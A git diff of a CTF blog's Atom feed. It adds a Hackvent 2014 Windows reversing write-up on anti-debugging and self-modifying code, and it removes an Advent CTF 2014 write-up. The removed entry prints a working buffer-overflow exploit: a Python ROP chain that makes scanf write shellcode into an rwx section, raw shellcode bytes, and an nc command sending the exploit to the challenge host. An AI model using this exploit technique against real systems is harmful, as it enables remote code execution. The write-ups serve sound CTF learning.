@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-12-27T10:31:15+01:00</updated>
+  <updated>2014-12-27T15:20:21+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,112 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hackvent 2014 - Reversing Day 23]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23/"/>
+    <updated>2014-12-27T14:45:39+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23</id>
+    <content type="html"><![CDATA[<p>Someone passed me a binary and said &lsquo;Here, you&rsquo;ll enjoy this one&rsquo;. I most certainly did&hellip;</p>
+
+<!-- more -->
+
+
+<p>The guy also gave one hint, which I needed later. I started checking out the binary, which turned out to be a 32-bit Windows PE executable. I downloaded <a href="http://modern.ie">an XP VM</a> and an old, familiar friend: <a href="http://www.ollydbg.de">OllyDbg 1.10</a>, arguably the best debugger for Windows.</p>
+
+<p>Starting up the binary, I was presented with a simple dialog:</p>
+
+<p><img src="/assets/hv14/hv14-00.png" alt="" /></p>
+
+<p>I tried entering a string to check, but it didn&rsquo;t do anything. I set a few breakpoints, but when I switched back to the dialog, the binary crashed!</p>
+
+<p><img src="/assets/hv14/hv14-01.png" alt="" /></p>
+
+<p>What was going on here? <code>IsDebuggerPresent</code> was not referenced in the code, but maybe something else was going on. I set a memory breakpoint on a piece of code where I previously had set a breakpoint and pressed F9.</p>
+
+<p><img src="/assets/hv14/hv14-02.png" alt="" /></p>
+
+<p>Then, the binary stopped here:</p>
+
+<p><img src="/assets/hv14/hv14-03.png" alt="" /></p>
+
+<p>Quite interesting! The binary checks itself for <code>0xCC</code> bytes, aka <code>INT 3</code>. There were two of those checks, one at <code>0x4025e0</code> and one at <code>0x402536</code>. I modified the following <code>JNZ</code> to a <code>JMP</code> so the code would never do anything when it found a breakpoint. Now I could set breakpoints where ever I liked!</p>
+
+<p>Back to the <code>SendDlgItemMessageA</code> calls.</p>
+
+<p><img src="/assets/hv14/hv14-04.png" alt="" /></p>
+
+<p>The binary checks the length of our input and if it is exactly <code>0x1D</code> or 29 bytes, it continues by fetching the input. It checks the input for <code>-</code> characters at specific places. From this I deduced that the format of the input should be <code>ABCD-DEFG-HIJK-LMNO-PQRS-TUVW</code>. I entered that and pressed check, ending up here:</p>
+
+<p><img src="/assets/hv14/hv14-06.png" alt="" /></p>
+
+<p>The code now sends a message to its message queue, but I didn&rsquo;t know the location of the handler. No worries; I stepped into the call with F7 until I was in NTDLL.dll, and then set a memory breakpoint on the code area at <code>0x401000</code>. A break-on-access also works.</p>
+
+<p><img src="/assets/hv14/hv14-07.png" alt="" /></p>
+
+<p>After pressing F9, this landed me at the handler!</p>
+
+<p><img src="/assets/hv14/hv14-08.png" alt="" /></p>
+
+<p>I traced through this function with F7, finally ending up here:</p>
+
+<p><img src="/assets/hv14/hv14-09.png" alt="" /></p>
+
+<p>The code takes the first four bytes of our input, XORs them with a certain value and then proceeds to call the code at the resulting value&hellip; Only problem is, there was no code at <code>0x703234BD</code>! I remembered the hint I got at the beginning: &ldquo;the flag probably starts with <code>HV14</code>&rdquo;. I changed the input to <code>HV14-ABCD-DEFG-HIJK-LMNO-PQRS</code> and restarted it again, to end up at the same CALL EAX:</p>
+
+<p><img src="/assets/hv14/hv14-10.png" alt="" /></p>
+
+<p>With a single F7, I ended up here:</p>
+
+<p><img src="/assets/hv14/hv14-11.png" alt="" /></p>
+
+<p>Here, some tricky stuff starts happening! A call to <code>VirtualProtect</code> makes the code in front of us writeable, and the binary starts modifying that code:</p>
+
+<p><img src="/assets/hv14/hv14-12.png" alt="" /></p>
+
+<p>Tricky, especially the call that emerges:</p>
+
+<p><img src="/assets/hv14/hv14-13.png" alt="" /></p>
+
+<p>Carefully using F7, I traced passed this anti-disassembler trick and found myself at this CALL ECX:</p>
+
+<p><img src="/assets/hv14/hv14-14.png" alt="" /></p>
+
+<p>I stepped into it, landing at this position. Now it becomes really interesting, the binary apparently calls a function that does <em>something</em> with our input, then sends another message to the message queue. I decided to place a breakpoint at <code>0x4022B3</code> and pressed F9; I would examine the function later. First see what happens:</p>
+
+<p><img src="/assets/hv14/hv14-15.png" alt="" /></p>
+
+<p>Indeed, we land at the message handler. After decrypting a string, the binary does a byte-by-byte comparison of our mangled input and some other buffer:</p>
+
+<p><img src="/assets/hv14/hv14-17.png" alt="" /></p>
+
+<p>The code that comes after it congratulates us, but only if the buffer equals our mangled input. I decided to find out where our input was being mangled. I restarted the binary and set a memory breakpoint on the first four bytes of the input:</p>
+
+<p><img src="/assets/hv14/hv14-18.png" alt="" /></p>
+
+<p>Pressing F9, the code breaks at the CALL EAX, of course. Another F9 lands us here:</p>
+
+<p><img src="/assets/hv14/hv14-19.png" alt="" /></p>
+
+<p>Ah! The first byte of our input, &lsquo;H&rsquo;, is being XOR&#8217;ed with another value. This is repeated for all the bytes in the input:</p>
+
+<p><img src="/assets/hv14/hv14-20.png" alt="" /></p>
+
+<p>I wrote down (literally!) all the values that were used in <code>AL</code> and finally, I ended up at the REPE CMPS instruction:</p>
+
+<p><img src="/assets/hv14/hv14-21.png" alt="" /></p>
+
+<p>I took note of the values at <code>EDI</code> and together with the values from the XOR statement earlier, I had all the thing necessary to grab the flag! Sprinkle in some Python magic:</p>
+
+<p><img src="/assets/hv14/hv14-22.png" alt="" /></p>
+
+<p>And we have the flag!</p>
+
+<p><img src="/assets/hv14/hv14-23.png" alt="" /></p>
+
+<p>It has been a while since I got to use OllyDbg to reverse a Windows binary. Between the self-modifying code, the use of the flag and <code>SendMessage</code> to control code execution, this was a very enjoyable challenge!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
@@ -691,109 +797,6 @@ ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
 </code></pre>
 
 <p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Advent CTF 2014 - Oh My Scanf]]></title>
-    <link href="http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf/"/>
-    <updated>2014-12-17T22:22:34+01:00</updated>
-    <id>http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf</id>
-    <content type="html"><![CDATA[<p>Another month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!</p>
-
-<!-- more -->
-
-
-<p>We&rsquo;re given a vulnerable binary plus the C source:</p>
-
-<pre><code class="c">/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */
-#include &lt;stdio.h&gt;
-
-int main(void) {
-    char name[16];
-
-    setvbuf(stdout, NULL, _IONBF, 0);
-    printf("name: ");
-    scanf("%s", name);
-    printf("hi, %s\n", name);
-
-    return 0;
-}
-</code></pre>
-
-<p>This looks pretty straight-forward, right? <code>scanf</code>, an executable stack and a small buffer, oh my! A standard buffer overflow:</p>
-
-<pre><code class="bash">bas@tritonal:~/adventctf$ ulimit -c unlimited
-bas@tritonal:~/adventctf$ ./oh_my_scanf 
-name: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
-hi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
-Segmentation fault (core dumped)
-</code></pre>
-
-<p>I checked <code>gdb</code> and <code>eip</code> was overwritten with <code>HHHH</code>, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it&hellip; but how? ALSR is enabled so we don&rsquo;t know the location of the stack. None of the registers contain a pointer to the shellcode, there aren&rsquo;t any <code>jmp esp</code> or <code>call esp</code> instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets.</p>
-
-<p>Thinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing <code>scanf</code> to build shellcode somewhere. superkojiman noticed that the main code section is <code>rwx</code>!</p>
-
-<pre><code>gdb-peda$ vmmap
-Start      End        Perm  Name
-0x08048000 0x08049000 r-xp  /home/bas/adventctf/oh_my_scanf
-0x08049000 0x0804a000 r-xp  /home/bas/adventctf/oh_my_scanf
-0x0804a000 0x0804b000 rwxp  /home/bas/adventctf/oh_my_scanf
-0xf7e19000 0xf7e1a000 rwxp  mapped
-...snip...
-</code></pre>
-
-<p>Yes, this has to be it! We can write to a section of memory that is executable <em>and</em> at a fixed location. After writing shellcode there, we simply jump to it to have our cake <em>and</em> eat it.</p>
-
-<p>So I modified a ROP chain that I was fiddling with:</p>
-
-<pre><code class="python">#!/usr/bin/python
-import struct
-
-def p(x):
-  return struct.pack("&lt;L", x)
-
-SCANF = 0x80483b0a
-POPRET = 0x804835d
-SCANF_STRING = 0x80495ce
-
-payload = ""
-payload += "A"*28
-
-payload += p(SCANF)         # return-to-got, scanf
-payload += p(POPRET)        # next return address
-payload += p(SCANF_STRING)  # pointer to "%s", arg1 for scanf
-payload += p(0x0804a040)    # pointer to readable/executable
-                            # arbitrarily chosen section of code
-                            # it doubles as return address
-payload += "\n"             # close first scanf call
-
-# this modified shellcode below will be read by the scanf call that results from our ROP chain.
-# we need the extra "\na" to flush the buffer, i think. 
-payload += "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x54\x59\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag\na"
-
-print payload
-</code></pre>
-
-<p>I used a modified version of <a href="http://www.shell-storm.org/shellcode/files/shellcode-73.php">this shellcode</a>. The shellcode wasn&rsquo;t working locally, and I narrowed it down quickly to a bad byte, <code>0x0c</code>. This was part of the <code>lea ecx, [esp]</code> instruction. I exchanged this for:</p>
-
-<pre><code class="bash">bas@tritonal:~/adventctf$ rasm2 - 
-push esp
-54
-pop ecx
-59
-nop
-90
-</code></pre>
-
-<p>And off we went! I verified the exploit remotely by reading <code>/etc/passwd</code> and then I guessed the name of the flag file to be <code>flag</code>. Simple, really =)</p>
-
-<pre><code class="bash">bas@tritonal:~/adventctf$ python exploit.py | nc pwnable.katsudon.org 32100
-name: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..].E.@..
-ADCTF_Sc4NF_IS_PRe77Y_niCE
-</code></pre>
-
-<p>The flag was <code>ADCTF_Sc4NF_IS_PRe77Y_niCE</code>. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!</p>
 ]]></content>
   </entry>
   
